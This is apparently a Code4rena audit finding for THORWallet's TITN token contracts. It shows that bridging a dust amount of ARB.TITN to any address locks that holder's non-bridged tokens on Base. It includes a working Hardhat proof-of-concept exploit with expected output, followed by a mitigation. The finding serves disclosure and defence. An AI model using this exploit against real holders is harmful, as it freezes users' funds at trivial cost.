# THORWallet

## Contest Summary

Code under review: [2025-02-thorwallet](https://github.com/code-423n4/2025-02-thorwallet) (216 nSLOC)

Contest Page: [thorwallet-contest](https://code4rena.com/audits/2025-02-thorwallet)

## DoS Attack on Non-Bridged Token Holders via Bridging

## Finding description and impact

An attacker can convert TGT tokens to ARB.TITN using the `MergeTgt` contract and bridge them to any arbitrary user's address. If the recipient on the other chain holds non-bridged tokens and has unrestricted transfer capabilities, receiving the bridged tokens triggers the `Titn:_credit` function. This function updates `isBridgedTokenHolder[user's address] = true`, effectively revoking the user's ability to transfer their non-bridged tokens freely.

### Impact

This vulnerability is critical because an attacker can execute the exploit with a minimal amount of tokens (as low as `1000 Gwei ARB.TITN`) to indiscriminately restrict the transferability of any non-bridged token holder on `BASE.TITN`. Since the attack does not require significant cost or effort, it could be exploited on a mass scale, disrupting user activity and breaking expected token behavior.

## PoC

### Code Modification

- Adjustments are required in `Titn.sol` to facilitate Hardhat testing, including modifying `block.chainid` for local testing purposes.

```diff
contract Titn is OFT {
+   uint256 public block_chainid; // TODO need to remove this one

    constructor(
        string memory _name,
        string memory _symbol,
        address _lzEndpoint,
        address _delegate,
        uint256 initialMintAmount,
+       uint256 _block_chainid // TODO need to remove this one
    ) OFT(_name, _symbol, _lzEndpoint, _delegate) Ownable(_delegate) {
        _mint(msg.sender, initialMintAmount);
        lzEndpoint = _lzEndpoint;
        isBridgedTokensTransferLocked = true;
+       block_chainid = _block_chainid; //TODO need to remove this one
    }

    function _validateTransfer(address from, address to) internal view {
        // Arbitrum chain ID
        uint256 arbitrumChainId = 42161;

        // Check if the transfer is restricted
         if (
            // Restrict bridged token holders OR apply Arbitrum-specific restriction
            from != owner() // Exclude owner from restrictions
                && from != transferAllowedContract // Allow transfers to the transferAllowedContract
                && to != transferAllowedContract // Allow transfers to the transferAllowedContract
                && isBridgedTokensTransferLocked // Check if bridged transfers are locked
                && (isBridgedTokenHolder[from] ||
-               block.chainid == arbitrumChainId)
+               block_chainid == arbitrumChainId)
                && to != lzEndpoint // Allow transfers to LayerZero endpoint
        ) {
            revert BridgedTokensTransferLocked();
        }
    }



}
```

### Test Case Setup

- The following test scenario initializes the necessary contracts and sets up token distributions for the attacker and legitimate users.

```diff
+   let attacker: SignerWithAddress
+   let user1_base: SignerWithAddress
+   let user2_base: SignerWithAddress

 beforeEach(async function () {

        baseTITN = await Titn.deploy(
            'baseTitn',
            'baseTITN',
            mockEndpointV2A.address,
            ownerA.address,
            ethers.utils.parseUnits('1000000000', 18),
+           8453 // block_chainid
        )

        arbTITN = await Titn.deploy(
            'arbTitn',
            'arbTITN',
            mockEndpointV2B.address,
            ownerB.address,
            ethers.utils.parseUnits('0', 18),
+           42161 // block_chainid
        )

+       // attacker got TGT tokens on Arbitrum
+       await tgt.connect(ownerB).transfer(attacker.address, ethers.utils.parseUnits('1000', 18))

+       // users on base chain got Non-Bridged TITN tokens
+       await baseTITN.connect(ownerA).transfer(user1_base.address, ethers.utils.parseUnits('1000', 18))
+       await baseTITN.connect(ownerA).transfer(user2_base.address, ethers.utils.parseUnits('1000', 18))
    })


```

### Attack Execution

- This test demonstrates how an attacker can manipulate the bridging mechanism to lock a non-bridged token holder’s ability to transfer tokens.

```javascript
 describe('Attack', function () {
        it('non-bridged token holder transfer failed', async function () {
            console.log('user1_base Non-Bridged TITN balance : ', await baseTITN.balanceOf(user1_base.address))
            console.log('user2_base Non-Bridged TITN balance : ', await baseTITN.balanceOf(user2_base.address))

            console.log('user1_base can freely transfer his non-bridged tokens to user2_base')
            await baseTITN.connect(user1_base).transfer(user2_base.address, ethers.utils.parseUnits('2', 18))

            console.log('user1_base Non-Bridged TITN balance : ', await baseTITN.balanceOf(user1_base.address))
            console.log('user2_base Non-Bridged TITN balance : ', await baseTITN.balanceOf(user2_base.address))

            console.log('Attacker converting TGT to ARB.TITN through MergeTgt contract')
            await tgt.connect(attacker).approve(mergeTgt.address, ethers.utils.parseUnits('100', 18))
            await tgt.connect(attacker).transferAndCall(mergeTgt.address, ethers.utils.parseUnits('100', 18), '0x')

            console.log('Attacker claiming TITN tokens')
            const claimableAmount = await mergeTgt.claimableTitnPerUser(attacker.address)
            await mergeTgt.connect(attacker).claimTitn(claimableAmount)

            const options = Options.newOptions().addExecutorLzReceiveOption(200000, 0).toHex().toString()
            console.log(attacker.address)
            const sendParam = [
                eidA,
                ethers.utils.hexZeroPad(user1_base.address, 32),
                ethers.utils.parseUnits('0.000001', 18),
                ethers.utils.parseUnits('0.000001', 18),
                options,
                '0x',
                '0x',
            ]

            const [nativeFee] = await arbTITN.quoteSend(sendParam, false)
            console.log('Attacker bridging as low as 1000 GWei to user1_base address instead of his own')
            await arbTITN.connect(attacker).send(sendParam, [nativeFee, 0], attacker.address, { value: nativeFee })

            console.log('user1_base tries to send his non bridged BASE.TITN to user2_base')
            try {
                await baseTITN.connect(user1_base).transfer(user2_base.address, ethers.utils.parseUnits('1', 18))
                expect.fail('Transaction should have reverted')
            } catch (error: any) {
                console.log('error.message', error.message)
                console.log('TRANSFER FAILED MEANWHILE THE USER1_BASE WAS A NON BRIDGED TOKEN HOLDER')
                expect(error.message).to.include('BridgedTokensTransferLocked')
            }
        })
    })
```

### Test Command

- Execute the following command to reproduce the issue:

```bash
npx hardhat test --grep "non-bridged token holder transfer failed"
```

### Expected Output

- The expected output confirms that a non-bridged token holder is unable to transfer their tokens after the attack, validating the exploit.

```bash

  MergeTgt tests
    Attack
user1_base Non-Bridged TITN balance :  BigNumber { value: "1000000000000000000000" }
user2_base Non-Bridged TITN balance :  BigNumber { value: "1000000000000000000000" }
user1_base can freely transfer his non-bridged tokens to user2_base
user1_base Non-Bridged TITN balance :  BigNumber { value: "998000000000000000000" }
user2_base Non-Bridged TITN balance :  BigNumber { value: "1002000000000000000000" }
Attacker converting TGT to ARB.TITN through MergeTgt contract
Attacker claiming TITN tokens
0x976EA74026E726554dB657fA54763abd0C3a0aa9
Attacker bridging as low as 1000 GWei to user1_base address instead of his own
user1_base tries to send his non bridged BASE.TITN to user2_base
error.message VM Exception while processing transaction: reverted with custom error 'BridgedTokensTransferLocked()'
TRANSFER FAILED MEANWHILE THE USER1_BASE WAS A NON BRIDGED TOKEN HOLDER
      ✔ non-bridged token holder transfer failed (39ms)


  1 passing (776ms)
```

## Tools Used

Manual code review / Hardhat tests

## Recommended mitigation steps

- Modify the function in `Titn.sol:send` to ensure that users can only bridge `ARB.TITN` tokens to their own address.

```solidity
import { SendParam, OFTReceipt, MessagingReceipt, MessagingFee } from "@layerzerolabs/oft-evm/contracts/interfaces/IOFT.sol";

function send(
  SendParam calldata _sendParam,
  MessagingFee calldata _fee,
  address _refundAddress
)
  external
  payable
  virtual
  override
  returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)
{
  require(
    _sendParam.to == bytes32(uint256(uint160(msg.sender))),
    "OFT: INVALID_TO_ADDRESS"
  );
  return super._send(_sendParam, _fee, _refundAddress);
}
```
